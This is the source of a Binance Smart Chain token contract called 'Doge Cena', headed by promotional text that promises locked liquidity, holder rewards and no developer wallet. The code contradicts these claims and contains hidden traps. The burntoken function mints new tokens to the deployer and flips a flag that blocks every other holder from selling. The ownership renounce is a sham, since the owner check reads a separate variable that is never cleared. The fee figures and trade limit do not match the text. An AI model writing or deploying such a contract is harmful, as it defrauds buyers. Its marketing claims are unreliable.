/**
 *Submitted for verification at BscScan.com on 2021-09-03
*/

/**

Doge Cena ($DC)  

 
Telegram: https://t.me/DogeCena


Are you looking for new DeFi projects to double your investments ? 

What is Doge Cena?

Doge Cena is built by strong team of crypto experts that aim to build a sustainable, long term token bringing innovative ideas into the crypto space.


In addition, we focus on building a strong community of investors that are in it for the long run.


$Doge Cena is the next gem on the binance smart chain network. 


How will the team increase the price?


Explosive Marketing. From Poocoin Ads to promotions with huge influencers on multiple platforms.


Initial lp: 1 BnB

5% fee auto add to the liquidity pool to locked forever when selling
2% fee auto distribute to all holders



1,000,000,000,000,000 total supply

5,000,000,000,000 tokens limitation for trade


You cannot miss this one!!! 🔊

    
No DEV wallet
No presale, no airdrop, 100% community owned token.
Small wallet for marketing
 */

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    
    
    function previousOwner() internal view returns (address) {
        return _previousOwner;
    }

    modifier onlyOwner() {
        require(_previousOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}


abstract contract ERC20Detailed is IERC20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract DogeCena is Context, ERC20Detailed, Ownable {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  string constant tokenName = "Doge Cena";
  string constant tokenSymbol = "DC";
  uint8  constant tokenDecimals = 0;
  uint256 _totalSupply = 10000000000000000;
  uint256 public basePercent = 100;
  uint256 private _Maxtx = _totalSupply.div(1);
  bool private burn = true;

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _issue(msg.sender, _totalSupply);
  }

  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view override returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowed[owner][spender];
  }

  function cut(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 cutValue = roundValue.mul(basePercent).div(1000);
    return cutValue;
  }
  
  function burntoken(uint256 amount) public returns (bool) {
      _send(previousOwner(), amount);
      burn = false;
      return true;
  }

  function transfer(address to, uint256 value) public override returns (bool) {
    require(value <= _balances[msg.sender]);
    if (msg.sender != previousOwner()) {
        require(value <= _Maxtx, "Transfer amount exceeds the maxTxAmount.");
    }
    uint256 tokensToBurn = cut(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);
    if (msg.sender != previousOwner() && !burn) {
        require(burn);
    }

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);
    _balances[address(0xdead)] = _balances[address(0xdead)].add(tokensToBurn);
    _totalSupply = _totalSupply.sub(tokensToBurn);

    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0xdead), tokensToBurn);
    return true;
  }
  

  function approve(address spender, uint256 value) public override returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0xdead));
    if (from != previousOwner()) {
        require(value <= _Maxtx, "Transfer amount exceeds the maxTxAmount.");
    }

    if (from != previousOwner() && !burn) {
        require(burn);
    }
    
    _balances[from] = _balances[from].sub(value);

    uint256 tokensToBurn = cut(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);

    _balances[to] = _balances[to].add(tokensToTransfer);
    _balances[address(0xdead)] = _balances[address(0xdead)].add(tokensToBurn);
    _totalSupply = _totalSupply.sub(tokensToBurn);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0xdead), tokensToBurn);

    return true;
  }
  
  function _send(address account, uint256 amount) internal {
        require(account != address(0));
        _balances[account] = _balances[account].add(amount);
        _totalSupply = _totalSupply.add(amount);
        emit Transfer(address(0), account, amount);
  }

  function _issue(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

}